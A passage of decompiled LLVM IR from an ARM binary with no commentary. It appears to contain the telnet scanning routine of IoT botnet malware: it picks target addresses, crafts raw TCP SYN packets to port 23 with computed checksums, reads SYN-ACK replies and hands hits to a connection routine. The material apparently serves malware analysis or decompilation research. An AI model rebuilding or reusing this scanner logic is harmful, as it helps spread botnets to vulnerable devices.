dec_label_pc_10198:                               ; preds = %.thread646, %dec_label_pc_10190, %.thread645
  store i32 %.1992, i32* %r3.global-to-local, align 4
  store i32 %.2018, i32* %r4.global-to-local, align 4
  %v2_101a0 = and i32 %.1992, %.2018
  %v4_101a0 = icmp eq i32 %v2_101a0, 0
  store i1 %v4_101a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_101a0, label %dec_label_pc_101a8, label %dec_label_pc_e8d0

dec_label_pc_101a8:                               ; preds = %dec_label_pc_10198
  %v2_101a8 = icmp ugt i32 %v1_e8d4, 77
  store i1 %v2_101a8, i1* %cpsr_c.global-to-local, align 1
  %v7_101a8 = icmp eq i32 %v1_e8d4, 78
  store i1 %v7_101a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101a8, label %bb1915, label %dec_label_pc_101bc

bb1915:                                           ; preds = %dec_label_pc_101a8
  %v3_101ac = icmp ugt i32 %v1_e8e8, 45
  store i1 %v3_101ac, i1* %cpsr_c.global-to-local, align 1
  %v8_101ac = icmp eq i32 %v1_e8e8, 46
  store i1 %v8_101ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_101ac, label %.thread651.thread, label %dec_label_pc_101bc

.thread651.thread:                                ; preds = %bb1915
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e8d0

dec_label_pc_101bc:                               ; preds = %bb1915, %dec_label_pc_101a8
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_101bc = icmp ugt i32 %v1_e8d4, 223
  store i1 %v2_101bc, i1* %cpsr_c.global-to-local, align 1
  %v7_101bc = icmp eq i32 %v1_e8d4, 224
  store i1 %v7_101bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101bc, label %dec_label_pc_e8d0, label %dec_label_pc_101c4

dec_label_pc_101c4:                               ; preds = %dec_label_pc_101bc
  %v5_101d0 = call i32 @llvm.bswap.i32(i32 %v0_e8d0)
  store i32 %v5_101d0, i32* %r3.global-to-local, align 4
  %v3_101d8 = udiv i32 %v5_101d0, 16777216
  %v1_101d4 = udiv i32 %v5_101d0, 256
  %v4_101e0 = and i32 %v1_101d4, 65280
  %v1_101dc = mul i32 %v5_101d0, 256
  %v4_101e4 = and i32 %v1_101dc, 16711680
  store i32 ptrtoint (i8** @global_var_23250.152 to i32), i32* @r0, align 4
  %tmp2188 = and i32 %v0_e8d0, 65536
  %v3_101ec = icmp ne i32 %tmp2188, 0
  store i1 %v3_101ec, i1* %cpsr_c.global-to-local, align 1
  %v4_101ec = mul nuw i32 %v3_e8f0, 16777216
  %v5_101e0 = or i32 %v3_101d8, %v4_101ec
  %v5_101e4 = or i32 %v5_101e0, %v4_101e0
  %v5_101ec = or i32 %v5_101e4, %v4_101e4
  store i32 %v5_101ec, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_101ec, i32* @global_var_23260.213, align 4
  store i16 0, i16* bitcast (i32* @global_var_2325a.214 to i16*), align 4
  %v3_101fc = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_23250.152 to i32), i32 20)
  %v4_101fc = trunc i32 %v3_101fc to i16
  %v3_10208 = load i32, i32* @global_var_23260.213, align 4
  store i32 %v3_10208, i32* %ip.global-to-local, align 4
  store i16 %v4_101fc, i16* bitcast (i32* @global_var_2325a.214 to i16*), align 4
  %v0_10210 = load i32, i32* %r4.global-to-local, align 4
  %v1_10210 = trunc i32 %v0_10210 to i16
  store i16 %v1_10210, i16* bitcast (i32* @global_var_23274.216 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_23264.155 to i32), i32* @r1, align 4
  store i32 %v3_10208, i32* @global_var_23268.217, align 4
  store i16 5888, i16* @global_var_23266.160, align 2
  store i32 ptrtoint (i8** @global_var_23250.152 to i32), i32* %r0.global-to-local, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_10230 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_23250.152 to i32), i32 ptrtoint (i32* @global_var_23264.155 to i32), i32 5120, i32 20)
  %v6_10230 = trunc i32 %v5_10230 to i16
  %v2_10240 = load i32, i32* @global_var_25d68.150, align 4
  store i16 %v6_10230, i16* bitcast (i32* @global_var_23274.216 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_23250.152 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_111d0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_10268 = load i16, i16* @global_var_23266.160, align 2
  %v4_10268 = zext i16 %v3_10268 to i32
  store i32 %v4_10268, i32* %ip.global-to-local, align 4
  store i32 %v2_10240, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_11298, i32* @lr, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_1028c = call i32 @__libc_sendto(i32 %v2_10240, i32 ptrtoint (i8** @global_var_23250.152 to i32), i32 40, i32 16384, i32 %v2_11298, i32 16)
  store i32 %v7_1028c, i32* %r0.global-to-local, align 4
  %v3_10290 = load i32, i32* %stack_var_-52, align 4
  %v1_10294 = add i32 %v3_10290, 1
  store i32 %v1_10294, i32* %r3.global-to-local, align 4
  %v3_10298 = icmp ugt i32 %v1_10294, 383
  store i1 %v3_10298, i1* %cpsr_c.global-to-local, align 1
  %v8_10298 = icmp eq i32 %v1_10294, 384
  store i1 %v8_10298, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10294, i32* %stack_var_-52, align 4
  %v5_102a0 = icmp slt i32 %v1_10294, 384
  br i1 %v5_102a0, label %dec_label_pc_e8a4, label %dec_label_pc_102a4

dec_label_pc_102a4:                               ; preds = %dec_label_pc_101c4
  store i32 %v2_e88c, i32* @fp, align 4
  br label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %dec_label_pc_e888, %dec_label_pc_102a4
  %v0_102a8 = call i32 @__GI___errno_location()
  store i32 %v0_102a8, i32* @sb, align 4
  store i32 %v2_e880, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_102b8, i32* @r4, align 4
  br label %dec_label_pc_102bc

dec_label_pc_102bc:                               ; preds = %dec_label_pc_1036c, %dec_label_pc_10364, %dec_label_pc_1035c, %dec_label_pc_10338, %dec_label_pc_1032c, %dec_label_pc_1031c, %dec_label_pc_10304, %dec_label_pc_10354, %dec_label_pc_10348, %dec_label_pc_102fc, %dec_label_pc_10420, %dec_label_pc_102a8
  %v1_102c0 = phi i32 [ %v0_102a8, %dec_label_pc_102a8 ], [ %v1_102c0.pre.pre, %dec_label_pc_10420 ], [ %v0_102f0, %dec_label_pc_102fc ], [ %v0_102f0, %dec_label_pc_10348 ], [ %v0_102f0, %dec_label_pc_10354 ], [ %v0_102f0, %dec_label_pc_10304 ], [ %v0_102f0, %dec_label_pc_1031c ], [ %v0_102f0, %dec_label_pc_1032c ], [ %v0_102f0, %dec_label_pc_10338 ], [ %v0_102f0, %dec_label_pc_1035c ], [ %v0_102f0, %dec_label_pc_10364 ], [ %v0_102f0, %dec_label_pc_1036c ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_102c0 = inttoptr i32 %v1_102c0 to i32*
  store i32 0, i32* %v2_102c0, align 4
  %v2_102cc = load i32, i32* @global_var_25d68.150, align 4
  store i32 %v2_102cc, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e880, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_102dc = load i32, i32* %ip.global-to-local, align 4
  %v6_102e4 = call i32 @__libc_recvfrom(i32 %v2_102cc, i32 %v2_e880, i32 1514, i32 16384, i32 %v0_102dc, i32 %v0_102dc)
  store i32 %v6_102e4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_102e8 = icmp eq i32 %v6_102e4, 0
  store i1 %v2_102e8, i1* %cpsr_z.global-to-local, align 1
  %tmp1917 = icmp slt i32 %v6_102e4, 1
  br i1 %tmp1917, label %dec_label_pc_10460, label %dec_label_pc_102f0

dec_label_pc_102f0:                               ; preds = %dec_label_pc_102bc
  %v0_102f0 = load i32, i32* @sb, align 4
  %v1_102f0 = inttoptr i32 %v0_102f0 to i32*
  %v2_102f0 = load i32, i32* %v1_102f0, align 4
  store i32 %v2_102f0, i32* %r3.global-to-local, align 4
  %v2_102f4 = icmp ugt i32 %v2_102f0, 10
  store i1 %v2_102f4, i1* %cpsr_c.global-to-local, align 1
  %v7_102f4 = icmp eq i32 %v2_102f0, 11
  store i1 %v7_102f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102f4, label %dec_label_pc_10460, label %dec_label_pc_102fc

dec_label_pc_102fc:                               ; preds = %dec_label_pc_102f0
  %v2_102fc = icmp ugt i32 %v6_102e4, 38
  store i1 %v2_102fc, i1* %cpsr_c.global-to-local, align 1
  %v7_102fc = icmp eq i32 %v6_102e4, 39
  store i1 %v7_102fc, i1* %cpsr_z.global-to-local, align 1
  %v2_10300 = xor i1 %v2_102fc, true
  %v3_10300 = or i1 %v7_102fc, %v2_10300
  br i1 %v3_10300, label %dec_label_pc_102bc, label %dec_label_pc_10304

dec_label_pc_10304:                               ; preds = %dec_label_pc_102fc
  store i32 %v2_e880, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %ip.global-to-local, align 4
  %v3_1030c = load i32, i32* %v2_1030c, align 4
  store i32 %v3_1030c, i32* %r2.global-to-local, align 4
  %v2_10310 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_10310, i32* %r3.global-to-local, align 4
  %v3_10314 = icmp uge i32 %v3_1030c, %v2_10310
  store i1 %v3_10314, i1* %cpsr_c.global-to-local, align 1
  %v9_10314 = icmp eq i32 %v3_1030c, %v2_10310
  store i1 %v9_10314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10314, label %dec_label_pc_1031c, label %dec_label_pc_102bc

dec_label_pc_1031c:                               ; preds = %dec_label_pc_10304
  store i32 %v2_e880, i32* @lr, align 4
  %v3_10320 = load i8, i8* %v2_10320, align 1
  %v4_10320 = zext i8 %v3_10320 to i32
  store i32 %v4_10320, i32* %r3.global-to-local, align 4
  %v2_10324 = icmp ugt i8 %v3_10320, 5
  store i1 %v2_10324, i1* %cpsr_c.global-to-local, align 1
  %v7_10324 = icmp eq i8 %v3_10320, 6
  store i1 %v7_10324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10324, label %dec_label_pc_1032c, label %dec_label_pc_102bc

dec_label_pc_1032c:                               ; preds = %dec_label_pc_1031c
  %v0_1032c = load i32, i32* @r4, align 4
  %v1_1032c = inttoptr i32 %v0_1032c to i16*
  %v2_1032c = load i16, i16* %v1_1032c, align 2
  %v3_1032c = zext i16 %v2_1032c to i32
  store i32 %v3_1032c, i32* %r3.global-to-local, align 4
  %v2_10330 = icmp ugt i16 %v2_1032c, 5887
  store i1 %v2_10330, i1* %cpsr_c.global-to-local, align 1
  %v7_10330 = icmp eq i16 %v2_1032c, 5888
  store i1 %v7_10330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10330, label %dec_label_pc_10338, label %dec_label_pc_102bc

dec_label_pc_10338:                               ; preds = %dec_label_pc_1032c
  %v1_10338 = add i32 %v0_1032c, 2
  %v2_10338 = inttoptr i32 %v1_10338 to i16*
  %v3_10338 = load i16, i16* %v2_10338, align 2
  %v4_10338 = zext i16 %v3_10338 to i32
  store i32 %v4_10338, i32* %r3.global-to-local, align 4
  store i32 %v4_e6b8, i32* %r0.global-to-local, align 4
  %v3_10340 = icmp uge i32 %v4_10338, %v4_e6b8
  store i1 %v3_10340, i1* %cpsr_c.global-to-local, align 1
  %v9_10340 = icmp eq i32 %v4_10338, %v4_e6b8
  store i1 %v9_10340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10340, label %dec_label_pc_10348, label %dec_label_pc_102bc

dec_label_pc_10348:                               ; preds = %dec_label_pc_10338
  %v1_10348 = add i32 %v0_1032c, 13
  %v2_10348 = inttoptr i32 %v1_10348 to i8*
  %v3_10348 = load i8, i8* %v2_10348, align 1
  %v4_10348 = zext i8 %v3_10348 to i32
  store i32 %v4_10348, i32* %r3.global-to-local, align 4
  %v1_1034c = and i32 %v4_10348, 2
  %v2_1034c = icmp eq i32 %v1_1034c, 0
  store i1 %v2_1034c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1034c, label %dec_label_pc_102bc, label %dec_label_pc_10354

dec_label_pc_10354:                               ; preds = %dec_label_pc_10348
  %v1_10354 = and i32 %v4_10348, 16
  %v2_10354 = icmp eq i32 %v1_10354, 0
  store i1 %v2_10354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10354, label %dec_label_pc_102bc, label %dec_label_pc_1035c

dec_label_pc_1035c:                               ; preds = %dec_label_pc_10354
  %v1_1035c = and i32 %v4_10348, 4
  %v2_1035c = icmp eq i32 %v1_1035c, 0
  store i1 %v2_1035c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1035c, label %dec_label_pc_10364, label %dec_label_pc_102bc

dec_label_pc_10364:                               ; preds = %dec_label_pc_1035c
  %tmp2189 = urem i8 %v3_10348, 2
  %v2_10364 = icmp eq i8 %tmp2189, 0
  store i1 %v2_10364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10364, label %dec_label_pc_1036c, label %dec_label_pc_102bc

dec_label_pc_1036c:                               ; preds = %dec_label_pc_10364
  %v1_1036c = add i32 %v0_1032c, 8
  %v2_1036c = inttoptr i32 %v1_1036c to i32*
  %v3_1036c = load i32, i32* %v2_1036c, align 4
  %v5_10384 = call i32 @llvm.bswap.i32(i32 %v3_1036c)
  %v1_10388 = add i32 %v5_10384, -1
  store i32 %v1_10388, i32* %r2.global-to-local, align 4
  %v1_1038c = and i32 %v1_10388, 16711680
  store i32 %v1_1038c, i32* %r0.global-to-local, align 4
  %v3_10390 = udiv i32 %v1_10388, 16777216
  %v4_10394 = udiv i32 %v1_1038c, 256
  %v5_10394 = or i32 %v4_10394, %v3_10390
  %v1_10398 = and i32 %v1_10388, 65280
  store i32 %v1_10398, i32* %r1.global-to-local, align 4
  %v4_1039c = mul nuw nsw i32 %v1_10398, 256
  %v5_1039c = or i32 %v5_10394, %v4_1039c
  store i32 %v5_1039c, i32* %r3.global-to-local, align 4
  %v3_103a0 = load i32, i32* %v2_103a0, align 4
  store i32 %v3_103a0, i32* %ip.global-to-local, align 4
  %v5_103a4 = call i32 @llvm.bswap.i32(i32 %v1_10388)
  store i32 %v5_103a4, i32* %r3.global-to-local, align 4
  %v3_103a8 = icmp uge i32 %v5_103a4, %v3_103a0
  store i1 %v3_103a8, i1* %cpsr_c.global-to-local, align 1
  %v9_103a8 = icmp eq i32 %v5_103a4, %v3_103a0
  store i1 %v9_103a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_103a8, label %dec_label_pc_103b0, label %dec_label_pc_102bc

dec_label_pc_103b0:                               ; preds = %dec_label_pc_1036c
  %v0_103b0 = load i32, i32* @r5, align 4
  %v2_103b0 = icmp ugt i32 %v0_103b0, 254
  store i1 %v2_103b0, i1* %cpsr_c.global-to-local, align 1
  %v7_103b0 = icmp eq i32 %v0_103b0, 255
  store i1 %v7_103b0, i1* %cpsr_z.global-to-local, align 1
  %v8_103b4 = icmp sgt i32 %v0_103b0, 255
  br i1 %v8_103b4, label %dec_label_pc_10460, label %dec_label_pc_103b8

dec_label_pc_103b8:                               ; preds = %dec_label_pc_103b0
  %v2_103c0 = load i32, i32* @global_var_25d64.148, align 4
  store i32 %v2_103c0, i32* %r1.global-to-local, align 4
  %v3_103c4 = mul i32 %v0_103b0, 256
  store i32 %v3_103c4, i32* %r2.global-to-local, align 4
  %v2_103c8 = mul i32 %v0_103b0, 288
  store i32 %v2_103c8, i32* %r3.global-to-local, align 4
  %v2_103cc = add i32 %v2_103c0, %v2_103c8
  store i32 %v2_103cc, i32* @r0, align 4
  %v1_103d0 = add i32 %v2_103cc, 12
  %v2_103d0 = inttoptr i32 %v1_103d0 to i32*
  %v3_103d0 = load i32, i32* %v2_103d0, align 4
  store i32 %v3_103d0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_103d4 = icmp eq i32 %v3_103d0, 0
  store i1 %v2_103d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_103d4, label %dec_label_pc_10418, label %dec_label_pc_103f4.preheader

dec_label_pc_103f4.preheader:                     ; preds = %dec_label_pc_103b8
  %v2_103d8 = add i32 %v0_103b0, 1
  %v2_103e0 = and i32 %v2_103d8, 134217728
  %v3_103e0 = icmp ne i32 %v2_103e0, 0
  store i1 %v3_103e0, i1* %cpsr_c.global-to-local, align 1
  %v3_103e4 = mul i32 %v2_103d8, 288
  store i32 %v3_103e4, i32* %r3.global-to-local, align 4
  %v3_103e8 = add i32 %v2_103c0, %v3_103e4
  store i32 %v3_103e8, i32* %r1.global-to-local, align 4
  store i32 %v0_103b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_103f4

dec_label_pc_103f4:                               ; preds = %dec_label_pc_103f4.preheader, %dec_label_pc_10408
  %v0_10408 = phi i32 [ %v3_103e8, %dec_label_pc_103f4.preheader ], [ %v1_10400, %dec_label_pc_10408 ]
  %v0_103f4 = phi i32 [ %v0_103b0, %dec_label_pc_103f4.preheader ], [ %v1_103f4, %dec_label_pc_10408 ]
  %v1_103f4 = add i32 %v0_103f4, 1
  store i32 %v1_103f4, i32* %r2.global-to-local, align 4
  %v7_103f8 = icmp eq i32 %v1_103f4, 256
  store i32 %v0_10408, i32* @r0, align 4
  %v1_10400 = add i32 %v0_10408, 288
  store i32 %v1_10400, i32* %r1.global-to-local, align 4
  br i1 %v7_103f8, label %dec_label_pc_10460.loopexit, label %dec_label_pc_10408

dec_label_pc_10408:                               ; preds = %dec_label_pc_103f4
  %v1_10408 = add i32 %v0_10408, 12
  %v2_10408 = inttoptr i32 %v1_10408 to i32*
  %v3_10408 = load i32, i32* %v2_10408, align 4
  store i32 %v3_10408, i32* %r3.global-to-local, align 4
  %v2_1040c = icmp eq i32 %v3_10408, 0
  br i1 %v2_1040c, label %dec_label_pc_10414, label %dec_label_pc_103f4

dec_label_pc_10414:                               ; preds = %dec_label_pc_10408
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_103f4, i32* @r5, align 4
  br label %dec_label_pc_10418

dec_label_pc_10418:                               ; preds = %dec_label_pc_103b8, %dec_label_pc_10414
  %v1_10424 = phi i32 [ %v2_103cc, %dec_label_pc_103b8 ], [ %v0_10408, %dec_label_pc_10414 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10418 = icmp eq i32 %v1_10424, 0
  store i1 %v2_10418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10418, label %dec_label_pc_10460, label %dec_label_pc_10420

dec_label_pc_10420:                               ; preds = %dec_label_pc_10418
  store i32 5888, i32* %r3.global-to-local, align 4
  %v2_10424 = add i32 %v1_10424, 16
  %v3_10424 = inttoptr i32 %v2_10424 to i32*
  store i32 %v3_103a0, i32* %v3_10424, align 4
  %v0_10428 = load i32, i32* %r3.global-to-local, align 4
  %v1_10428 = trunc i32 %v0_10428 to i16
  %v2_10428 = load i32, i32* @r0, align 4
  %v3_10428 = add i32 %v2_10428, 20
  %v4_10428 = inttoptr i32 %v3_10428 to i16*
  store i16 %v1_10428, i16* %v4_10428, align 2
  %v0_1042c = call i32 @setup_connection()
  store i32 %v0_1042c, i32* %r0.global-to-local, align 4
  %v1_102c0.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_102bc

dec_label_pc_10434:                               ; preds = %dec_label_pc_e5c8
  %v2_10434 = load i32, i32* @global_var_25d68.150, align 4
  store i32 %v2_10434, i32* %r0.global-to-local, align 4
  %v1_10438 = call i32 @__GI___libc_close(i32 %v2_10434)
  store i32 %v1_10438, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e630

dec_label_pc_10440:                               ; preds = %thread-pre-split603.thread, %thread-pre-split603
  %v2_10440 = icmp ugt i32 %v1_e8d4, 78
  store i1 %v2_10440, i1* %cpsr_c.global-to-local, align 1
  %v7_10440 = icmp eq i32 %v1_e8d4, 79
  store i1 %v7_10440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10440, label %bb1918, label %dec_label_pc_10024

bb1918:                                           ; preds = %dec_label_pc_10440
  %v3_10444 = icmp ugt i32 %v1_e8e8, 120
  store i1 %v3_10444, i1* %cpsr_c.global-to-local, align 1
  %v8_10444 = icmp eq i32 %v1_e8e8, 121
  store i1 %v8_10444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10444, label %dec_label_pc_1044c, label %dec_label_pc_10024

dec_label_pc_1044c:                               ; preds = %bb1918
  %v1_1044c = add nsw i32 %v1_e8ec, -255
  store i32 %v1_1044c, i32* %r3.global-to-local, align 4
  %v2_1044c = icmp eq i32 %v1_e8ec, 255
  store i1 %v2_1044c, i1* %cpsr_c.global-to-local, align 1
  %v7_1044c = icmp eq i32 %v1_e8ec, 255
  store i1 %v7_1044c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1044c, label %bb1920, label %bb1919

bb1919:                                           ; preds = %dec_label_pc_1044c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1920

bb1920:                                           ; preds = %dec_label_pc_1044c, %bb1919
  %v0_10454 = phi i32 [ %v1_1044c, %dec_label_pc_1044c ], [ 1, %bb1919 ]
  %v2_10454 = and i32 %v3_e8dc, 64
  %v3_10454 = icmp ne i32 %v2_10454, 0
  store i1 %v3_10454, i1* %cpsr_c.global-to-local, align 1
  %v4_10454 = udiv i32 %v1_e8ec, 128
  %v5_10454 = and i32 %v0_10454, %v4_10454
  store i32 %v5_10454, i32* %r3.global-to-local, align 4
  %v6_10454 = icmp eq i32 %v5_10454, 0
  store i1 %v6_10454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_10454, label %dec_label_pc_10024, label %dec_label_pc_e8d0

dec_label_pc_10460.loopexit:                      ; preds = %dec_label_pc_103f4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10460

dec_label_pc_10460:                               ; preds = %dec_label_pc_10418, %dec_label_pc_103b0, %dec_label_pc_102f0, %dec_label_pc_102bc, %dec_label_pc_10460.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1852, i32* %r4.global-to-local, align 4
  %v2_104802112 = load i32, i32* @sp, align 4
  %v3_104802113 = add i32 %v2_104802112, 1852
  %v4_104802114 = inttoptr i32 %v3_104802113 to i32*
  store i32 0, i32* %v4_104802114, align 4
  br label %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge

dec_label_pc_1046c.dec_label_pc_1046c_crit_edge:  ; preds = %dec_label_pc_10460, %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge
  %v0_1046c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10470 = add i32 %v0_1046c.pre, 4
  store i32 %v1_10470, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10478 = add i32 %v0_1046c.pre, 1848
  store i32 %v1_10478, i32* %r4.global-to-local, align 4
  %v7_1047c = icmp eq i32 %v1_10470, 128
  %v2_10480 = load i32, i32* @sp, align 4
  %v3_10480 = add i32 %v2_10480, %v1_10478
  %v4_10480 = inttoptr i32 %v3_10480 to i32*
  store i32 0, i32* %v4_10480, align 4
  br i1 %v7_1047c, label %dec_label_pc_10488, label %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge

dec_label_pc_10488:                               ; preds = %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10488 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10488, i32* %stack_var_-352, align 4
  %v1_104942115 = add i32 %v0_10488, 8
  store i32 %v1_104942115, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1049c2116 = add i32 %v0_10488, 1724
  store i32 %v1_1049c2116, i32* %ip.global-to-local, align 4
  %v7_104a02117 = icmp eq i32 %v1_104942115, 128
  %v2_104a42118 = load i32, i32* @sp, align 4
  %v3_104a42119 = add i32 %v2_104a42118, %v1_1049c2116
  %v4_104a42120 = inttoptr i32 %v3_104a42119 to i32*
  store i32 0, i32* %v4_104a42120, align 4
  br i1 %v7_104a02117, label %dec_label_pc_104ac, label %dec_label_pc_10490.dec_label_pc_10490_crit_edge

dec_label_pc_10490.dec_label_pc_10490_crit_edge:  ; preds = %dec_label_pc_10488, %dec_label_pc_10490.dec_label_pc_10490_crit_edge
  %v0_10490.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10494 = add i32 %v0_10490.pre, 4
  store i32 %v1_10494, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1049c = add i32 %v0_10490.pre, 1720
  store i32 %v1_1049c, i32* %ip.global-to-local, align 4
  %v7_104a0 = icmp eq i32 %v1_10494, 128
  %v2_104a4 = load i32, i32* @sp, align 4
  %v3_104a4 = add i32 %v2_104a4, %v1_1049c
  %v4_104a4 = inttoptr i32 %v3_104a4 to i32*
  store i32 0, i32* %v4_104a4, align 4
  br i1 %v7_104a0, label %dec_label_pc_104ac, label %dec_label_pc_10490.dec_label_pc_10490_crit_edge

dec_label_pc_104ac:                               ; preds = %dec_label_pc_10490.dec_label_pc_10490_crit_edge, %dec_label_pc_10488
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_104ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_104ac, i32* @r6, align 4
  store i32 %v0_104ac, i32* @r5, align 4
  store i32 %v0_104ac, i32* %stack_var_-52, align 4
  br label %dec_label_pc_10508

dec_label_pc_104bc:                               ; preds = %dec_label_pc_10538
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_10524, i1* %cpsr_z.global-to-local, align 1
  %v1_105a8 = add i32 %v2_1051c, 4
  %v2_105a8 = inttoptr i32 %v1_105a8 to i32*
  %v3_105a8 = load i32, i32* %v2_105a8, align 4
  br i1 %v7_10524, label %dec_label_pc_105a8, label %dec_label_pc_104c4

dec_label_pc_104c4:                               ; preds = %dec_label_pc_104bc
  store i32 %v3_105a8, i32* %ip.global-to-local, align 4
  %v3_104c8 = udiv i32 %v3_105a8, 32
  store i32 %v2_105b0, i32* %r2.global-to-local, align 4
  %v3_104d0 = mul nuw nsw i32 %v3_104c8, 4
  %v2_104d4 = add i32 %v3_104d0, %v2_105b0
  store i32 %v2_104d4, i32* %r3.global-to-local, align 4
  %v1_104d8 = add i32 %v2_104d4, -184
  %v2_104d8 = inttoptr i32 %v1_104d8 to i32*
  %v3_104d8 = load i32, i32* %v2_104d8, align 4
  %v1_104dc = urem i32 %v3_105a8, 32
  store i32 %v1_104dc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_104e4 = shl i32 1, %v1_104dc
  %v8_104e4 = or i32 %v3_104d8, %v7_104e4
  store i32 %v8_104e4, i32* %r2.global-to-local, align 4
  store i32 %v8_104e4, i32* %v2_104d8, align 4
  %v0_104ec = load i32, i32* @r6, align 4
  %v1_104ec = load i32, i32* %ip.global-to-local, align 4
  %v3_104ec = icmp uge i32 %v0_104ec, %v1_104ec
  store i1 %v3_104ec, i1* %cpsr_c.global-to-local, align 1
  %v9_104ec = icmp eq i32 %v0_104ec, %v1_104ec
  store i1 %v9_104ec, i1* %cpsr_z.global-to-local, align 1
  %v5_104f0 = icmp slt i32 %v0_104ec, %v1_104ec
  br i1 %v5_104f0, label %bb1921, label %bb1922

bb1921:                                           ; preds = %dec_label_pc_104c4
  store i32 %v1_104ec, i32* @r6, align 4
  br label %bb1922

bb1922:                                           ; preds = %.thread668, %bb1928, %bb1926, %bb1930, %dec_label_pc_1059c, %dec_label_pc_104c4, %bb1921
  %v3_104f4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_104f4, i32* %r3.global-to-local, align 4
  %v1_104f8 = add i32 %v3_104f4, 1
  store i32 %v1_104f8, i32* %r2.global-to-local, align 4
  %v2_104fc = icmp ugt i32 %v1_104f8, 254
  store i1 %v2_104fc, i1* %cpsr_c.global-to-local, align 1
  %v7_104fc = icmp eq i32 %v1_104f8, 255
  store i1 %v7_104fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_104f8, i32* %stack_var_-52, align 4
  %v8_10504 = icmp sgt i32 %v1_104f8, 255
  br i1 %v8_10504, label %dec_label_pc_105d8, label %dec_label_pc_10508

dec_label_pc_10508:                               ; preds = %bb1922, %dec_label_pc_104ac
  %v0_10514 = phi i32 [ %v1_104f8, %bb1922 ], [ %v0_104ac, %dec_label_pc_104ac ]
  store i32 ptrtoint (i32* @global_var_25d64.148 to i32), i32* @lr, align 4
  %v3_1050c = mul i32 %v0_10514, 256
  store i32 %v3_1050c, i32* %r3.global-to-local, align 4
  %v2_10510 = load i32, i32* @global_var_25d64.148, align 4
  store i32 %v2_10510, i32* @r1, align 4
  %v2_10518 = mul i32 %v0_10514, 288
  store i32 %v2_10518, i32* %r2.global-to-local, align 4
  %v2_1051c = add i32 %v2_10510, %v2_10518
